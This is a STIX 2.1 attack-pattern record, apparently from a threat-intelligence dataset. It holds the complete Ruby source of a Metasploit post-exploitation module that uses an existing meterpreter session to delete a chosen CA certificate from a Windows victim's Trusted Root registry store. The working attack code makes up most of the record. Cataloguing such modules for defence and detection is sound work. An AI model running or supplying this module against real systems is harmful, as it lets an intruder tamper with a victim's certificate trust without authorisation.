{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--62271522-a1e0-4378-832f-a121c4de11e8",
    "created": "2024-08-14T16:33:04.974106Z",
    "modified": "2024-08-14T16:33:04.974109Z",
    "name": "Windows Manage Certificate Authority Removal",
    "description": " This module allows the attacker to remove an arbitrary CA certificate from the victim's Trusted Root store.  'License' => BSD_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/manage/remove_ca.rb",
            "external_id": "remove_ca.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Manage Certificate Authority Removal',\n        'Description' => %q{\n          This module allows the attacker to remove an arbitrary CA certificate\n          from the victim's Trusted Root store.\n        },\n        'License' => BSD_LICENSE,\n        'Author' => [ 'vt <nick.freeman[at]security-assessment.com>'],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_registry_open_key\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('CERTID', [ true, 'SHA1 hash of the certificate to remove.', '']),\n      ]\n    )\n  end\n\n  def run\n    certtoremove = datastore['CERTID']\n\n    open_key = nil\n    key = 'HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\SystemCertificates\\\\ROOT\\\\Certificates'\n    rkey, bkey = client.sys.registry.splitkey(key)\n\n    # Check if the requested cert is actually in the registry to start with\n    open_key = client.sys.registry.open_key(rkey, bkey, KEY_READ + 0x0000)\n    keys = open_key.enum_key\n\n    if (keys.length > 1)\n      if keys.include?(certtoremove)\n        # We found our target\n      else\n        print_error('The specified CA is not in the registry.')\n        return\n      end\n    else\n      print_error('These are not the CAs you are looking for (i.e. this registry branch is empty)')\n    end\n\n    open_key = client.sys.registry.open_key(rkey, bkey, KEY_WRITE + 0x0000)\n    open_key.delete_key(certtoremove)\n    print_good(\"Successfully deleted CA: #{certtoremove}\")\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}